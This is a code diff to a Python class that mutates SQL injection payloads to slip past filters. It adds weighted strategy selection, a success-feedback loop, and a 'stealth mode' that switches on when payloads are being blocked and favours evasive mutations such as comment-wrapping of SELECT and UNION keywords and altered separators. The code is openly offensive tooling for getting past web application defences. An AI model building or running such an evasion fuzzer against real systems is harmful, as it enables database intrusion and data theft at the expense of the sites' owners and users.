@@ -11,6 +11,10 @@ class ASTMutator:
             "junk_fill": self._junk_filling,
             "context_aware": self._context_aware_mutation
         }
+        # Awareness: Track success of each strategy
+        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
+        self.last_strategy_used = None
+        self.stealth_mode = False
 
     def mutate(self, payload, error_msg=None, intensity=1):
         mutated = str(payload)
@@ -22,15 +26,43 @@ class ASTMutator:
         # 2. Context-Aware Mutation: Detect and wrap payload if needed
         mutated = self._context_aware_wrap(mutated)
         
-        # 3. Standard Mutations with Dynamic Intensity
+        # 3. Standard Mutations with Weighted Selection
         num_mutations = random.randint(1, 2) * intensity
-        available_strats = list(self.strategies.keys())
         
+        # Awareness: If in stealth mode, favor stealthy strategies
+        current_weights = dict(self.strategy_weights)
+        if self.stealth_mode:
+            current_weights["context_aware"] *= 2.0
+            current_weights["inline_comments"] *= 2.0
+            print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)
+
         for _ in range(num_mutations):
-            strat = random.choice(available_strats)
-            mutated = self.strategies[strat](mutated)
+            # Pick strategy based on weights
+            names = list(self.strategies.keys())
+            weights = [current_weights[n] for n in names]
+            strat_name = random.choices(names, weights=weights, k=1)[0]
+            
+            self.last_strategy_used = strat_name
+            mutated = self.strategies[strat_name](mutated)
             
         return mutated
+
+    def report_success(self, score):
+        """Awareness: Update strategy weights based on the score achieved."""
+        # Detect if we are being blocked consistently
+        if score <= 0.1:
+            self.stealth_mode = True
+        else:
+            self.stealth_mode = False
+
+        if self.last_strategy_used and score > 0.5:
+            # Reward the strategy
+            self.strategy_weights[self.last_strategy_used] += 0.1
+            # Normalize to prevent runaway weights
+            total = sum(self.strategy_weights.values())
+            for k in self.strategy_weights:
+                self.strategy_weights[k] /= total
+                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0
 
     def _apply_error_feedback(self, payload, error):
         """Applies specific mutations based on SQL error messages."""
@@ -102,19 +134,10 @@ class ASTMutator:
     def _context_aware_mutation(self, payload):
         mutated = str(payload)
         
-        # 1. Quote Alteration: Swap quotes or use hex for strings
+        # 1. Quote Alteration: Swap quotes
         if "'" in mutated:
-            rand = random.random()
-            if rand < 0.4:
+            if random.random() < 0.4:
                 mutated = mutated.replace("'", '"')
-            elif rand < 0.7:
-                # Replace string literals with hex if they are in quotes
-                def to_hex(match):
-                    p1 = match.group(1)
-                    if p1:
-                        return f"0x{p1.encode().hex()}"
-                    return match.group(0)
-                mutated = re.sub(r"'([^']*)'", to_hex, mutated)
 
         # 2. Comment Wrapping: Wrap keywords or parts of the payload
         keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
@@ -128,7 +151,7 @@ class ASTMutator:
 
         # 3. Space/Separator Mutation
         if " " in mutated:
-            separators = ["/**/", "/*!*/", "+", "%20"]
+            separators = ["/**/", "/*!*/", "+"]
             sep = random.choice(separators)
             mutated = mutated.replace(" ", sep)
 
